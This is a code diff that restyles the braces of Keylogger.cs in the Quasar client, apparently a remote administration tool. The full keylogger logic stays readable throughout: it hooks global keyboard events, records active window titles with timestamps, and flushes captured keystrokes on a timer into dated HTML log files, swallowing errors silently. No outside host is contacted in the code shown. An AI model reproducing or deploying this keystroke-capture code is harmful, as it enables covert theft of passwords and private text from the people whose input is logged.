@@ -11,14 +11,12 @@ using System.Text;
 using System.Windows.Forms;
 using Timer = System.Timers.Timer;
 
-namespace Quasar.Client.Utilities
-{
+namespace Quasar.Client.Utilities {
     /// <summary>
     /// This class provides keylogging functionality and modifies/highlights the output for
     /// better user experience.
     /// </summary>
-    public class Keylogger : IDisposable
-    {
+    public class Keylogger : IDisposable {
         /// <summary>
         /// The current instance of this class, null if there is no instance.
         /// </summary>
@@ -46,8 +44,7 @@ namespace Quasar.Client.Utilities
         /// Creates the keylogger instance that provides keylogging functionality and starts it.
         /// </summary>
         /// <param name="flushInterval">The interval to flush the buffer to the logfile.</param>
-        public Keylogger(double flushInterval)
-        {
+        public Keylogger(double flushInterval) {
             Instance = this;
             _lastWindowTitle = string.Empty;
             _logFileBuffer = new StringBuilder();
@@ -64,21 +61,16 @@ namespace Quasar.Client.Utilities
         /// <summary>
         /// Disposes used resources by this class.
         /// </summary>
-        public void Dispose()
-        {
+        public void Dispose() {
             Dispose(true);
 
             GC.SuppressFinalize(this);
         }
 
-        protected virtual void Dispose(bool disposing)
-        {
-            if (!IsDisposed)
-            {
-                if (disposing)
-                {
-                    if (_timerFlush != null)
-                    {
+        protected virtual void Dispose(bool disposing) {
+            if (!IsDisposed) {
+                if (disposing) {
+                    if (_timerFlush != null) {
                         _timerFlush.Stop();
                         _timerFlush.Dispose();
                     }
@@ -90,16 +82,14 @@ namespace Quasar.Client.Utilities
             }
         }
 
-        private void Subscribe(IKeyboardMouseEvents events)
-        {
+        private void Subscribe(IKeyboardMouseEvents events) {
             _mEvents = events;
             _mEvents.KeyDown += OnKeyDown;
             _mEvents.KeyUp += OnKeyUp;
             _mEvents.KeyPress += OnKeyPress;
         }
 
-        private void Unsubscribe()
-        {
+        private void Unsubscribe() {
             if (_mEvents == null) return;
             _mEvents.KeyDown -= OnKeyDown;
             _mEvents.KeyUp -= OnKeyUp;
@@ -110,31 +100,26 @@ namespace Quasar.Client.Utilities
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
             string activeWindowTitle = KeyloggerHelper.GetActiveWindowTitle(); //Get active thread window title
-            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
-            {
+            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle) {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
-                    + KeyloggerHelper.Filter(activeWindowTitle) + " - " 
-                    + DateTime.Now.ToString("HH:mm") 
+                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
+                    + KeyloggerHelper.Filter(activeWindowTitle) + " - "
+                    + DateTime.Now.ToString("HH:mm")
                     + "</b>]</p><br>");
             }
 
-            if (_pressedKeys.IsModifierKeysSet())
-            {
-                if (!_pressedKeys.Contains(e.KeyCode))
-                {
+            if (_pressedKeys.IsModifierKeysSet()) {
+                if (!_pressedKeys.Contains(e.KeyCode)) {
                     Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                     _pressedKeys.Add(e.KeyCode);
                     return;
                 }
             }
 
-            if (!e.KeyCode.IsExcludedKey())
-            {
+            if (!e.KeyCode.IsExcludedKey()) {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
-                if (!_pressedKeys.Contains(e.KeyCode))
-                {
+                if (!_pressedKeys.Contains(e.KeyCode)) {
                     Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                     _pressedKeys.Add(e.KeyCode);
                 }
@@ -147,11 +132,9 @@ namespace Quasar.Client.Utilities
             if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                 return;
 
-            if ((!_pressedKeyChars.Contains(e.KeyChar) || !KeyloggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
-            {
+            if ((!_pressedKeyChars.Contains(e.KeyChar) || !KeyloggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar)) {
                 var filtered = KeyloggerHelper.Filter(e.KeyChar);
-                if (!string.IsNullOrEmpty(filtered))
-                {
+                if (!string.IsNullOrEmpty(filtered)) {
                     Debug.WriteLine("OnKeyPress Output: " + filtered);
                     if (_pressedKeys.IsModifierKeysSet())
                         _ignoreSpecialKeys = true;
@@ -168,20 +151,15 @@ namespace Quasar.Client.Utilities
             _pressedKeyChars.Clear();
         }
 
-        private string HighlightSpecialKeys(Keys[] keys)
-        {
+        private string HighlightSpecialKeys(Keys[] keys) {
             if (keys.Length < 1) return string.Empty;
 
             string[] names = new string[keys.Length];
-            for (int i = 0; i < keys.Length; i++)
-            {
-                if (!_ignoreSpecialKeys)
-                {
+            for (int i = 0; i < keys.Length; i++) {
+                if (!_ignoreSpecialKeys) {
                     names[i] = KeyloggerHelper.GetDisplayName(keys[i]);
                     Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
-                }
-                else
-                {
+                } else {
                     names[i] = string.Empty;
                     _pressedKeys.Remove(keys[i]);
                 }
@@ -189,13 +167,11 @@ namespace Quasar.Client.Utilities
 
             _ignoreSpecialKeys = false;
 
-            if (_pressedKeys.IsModifierKeysSet())
-            {
+            if (_pressedKeys.IsModifierKeysSet()) {
                 StringBuilder specialKeys = new StringBuilder();
 
                 int validSpecialKeys = 0;
-                for (int i = 0; i < names.Length; i++)
-                {
+                for (int i = 0; i < names.Length; i++) {
                     _pressedKeys.Remove(keys[i]);
                     if (string.IsNullOrEmpty(names[i])) continue;
 
@@ -213,13 +189,11 @@ namespace Quasar.Client.Utilities
 
             StringBuilder normalKeys = new StringBuilder();
 
-            for (int i = 0; i < names.Length; i++)
-            {
+            for (int i = 0; i < names.Length; i++) {
                 _pressedKeys.Remove(keys[i]);
                 if (string.IsNullOrEmpty(names[i])) continue;
 
-                switch (names[i])
-                {
+                switch (names[i]) {
                     case "Return":
                         normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                         break;
@@ -236,20 +210,17 @@ namespace Quasar.Client.Utilities
             return normalKeys.ToString();
         }
 
-        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
-        {
+        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e) {
             if (_logFileBuffer.Length > 0 && !QuasarClient.Exiting)
                 WriteFile();
         }
 
-        private void WriteFile()
-        {
+        private void WriteFile() {
             bool writeHeader = false;
 
             string filename = Path.Combine(LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
 
-            try
-            {
+            try {
                 DirectoryInfo di = new DirectoryInfo(LogDirectory);
 
                 if (!di.Exists)
@@ -263,8 +234,7 @@ namespace Quasar.Client.Utilities
 
                 StringBuilder logFile = new StringBuilder();
 
-                if (writeHeader)
-                {
+                if (writeHeader) {
                     logFile.Append(
                         "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
@@ -274,8 +244,7 @@ namespace Quasar.Client.Utilities
                     _lastWindowTitle = string.Empty;
                 }
 
-                if (_logFileBuffer.Length > 0)
-                {
+                if (_logFileBuffer.Length > 0) {
 
                     logFile.Append(_logFileBuffer);
                 }
@@ -283,9 +252,7 @@ namespace Quasar.Client.Utilities
                 FileHelper.WriteLogFile(filename, logFile.ToString());
 
                 logFile.Clear();
-            }
-            catch
-            {
+            } catch {
             }
 
             _logFileBuffer.Clear();
